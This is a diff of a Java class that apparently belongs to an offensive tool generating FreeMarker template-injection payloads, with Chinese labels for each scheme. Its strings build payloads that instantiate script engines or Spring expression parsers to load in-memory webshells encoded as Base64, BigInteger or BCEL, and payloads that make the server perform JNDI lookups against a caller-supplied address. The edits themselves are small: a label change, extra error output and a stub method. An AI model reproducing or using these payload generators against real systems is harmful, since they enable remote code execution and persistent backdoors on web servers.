@@ -50,13 +50,14 @@ public class FreeMarkerExpr implements IExpr {
                     "[+] JS-BASE64方案：==>" + System.lineSeparator() + out("${\"freemarker.template.utility.ObjectConstructor\"?new()(\"javax.script.ScriptEngineManager\").getEngineByName(\"js\").eval(\"" + MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.BASE64) + "\")}") + System.lineSeparator() + " <==",
                     "[+] JS-BigInteger方案：==>" + System.lineSeparator() + out("${\"freemarker.template.utility.ObjectConstructor\"?new()(\"javax.script.ScriptEngineManager\").getEngineByName(\"js\").eval(\"" + MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.BIGINTEGER) + "\")}") + System.lineSeparator() + " <==",
                     "[+] JS-BCEL方案：==>" + System.lineSeparator() + out("${\"freemarker.template.utility.ObjectConstructor\"?new()(\"javax.script.ScriptEngineManager\").getEngineByName(\"js\").eval(\"" + MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.BCEL) + "\")}") + System.lineSeparator() + " <==",
-                    "[+] 以下方案需具有SpEL依赖",
+                    "[+] 以下方案需具有spring-expression(SpEL)依赖",
                     "[+] Spring反射组件方案：==>" + System.lineSeparator() + out("${\"freemarker.template.utility.ObjectConstructor\"?new()(\"org.springframework.expression.spel.standard.SpelExpressionParser\").parseExpression(\"" + SpELMemShellFactory.genSpringMemShell1(memShellClass) + "\").getValue()}") + System.lineSeparator() + " <==",
                     "[+] BCEL方案：==>" + System.lineSeparator() + out("${\"freemarker.template.utility.ObjectConstructor\"?new()(\"org.springframework.expression.spel.standard.SpelExpressionParser\").parseExpression(\"" + SpELMemShellFactory.genSpringMemShell2(memShellClass) + "\").getValue()}") + System.lineSeparator() + " <=="
             };
         } catch (Exception ex) {
             return new String[]{
-                    "class文件异常"
+                    "class文件异常",
+                    Utils.getErrDetail(ex)
             };
         }
     }
@@ -67,6 +68,11 @@ public class FreeMarkerExpr implements IExpr {
                 out("${\"freemarker.template.utility.ObjectConstructor\"?new()(\"javax.naming.InitialContext\").lookup(\"" + jndiAddress + "\")}"),
                 out("${\"freemarker.template.utility.ObjectConstructor\"?new()(\"org.springframework.expression.spel.standard.SpelExpressionParser\").parseExpression(\"new javax.naming.InitialContext().lookup('" + jndiAddress + "')\").getValue()}")
         };
+    }
+
+    @Override
+    public String[] genLoadJar(String url, String className) {
+        return new String[0];
     }
 
     @Override
